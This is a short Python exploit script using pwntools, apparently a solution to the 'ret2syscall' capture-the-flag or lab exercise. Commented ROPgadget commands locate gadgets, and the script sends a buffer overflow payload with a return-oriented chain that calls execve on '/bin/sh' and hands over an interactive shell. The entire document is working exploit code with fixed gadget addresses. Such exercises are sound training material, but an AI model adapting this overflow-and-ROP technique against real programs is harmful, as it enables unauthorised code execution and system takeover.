#ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'eax'
#ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'ebx'
#ROPgadget --binary ret2syscall --string '/bin/sh'
#ROPgadget --binary ret2syscall --only 'int'

from pwn import *

offset = 0x6c + 4

sh = process(r"../ex1/ret2syscall")
addr_eax = 0x080bb196
addr_ebx = 0x0806eb90
addr_sh = 0x080be408
addr_int = 0x08049421
payload = b'A'*offset + p32(addr_eax) + p32(0xb) + p32(addr_ebx) + p32(0) + p32(0) + p32(addr_sh) + p32(addr_int)
sh.sendline(payload)
sh.interactive()
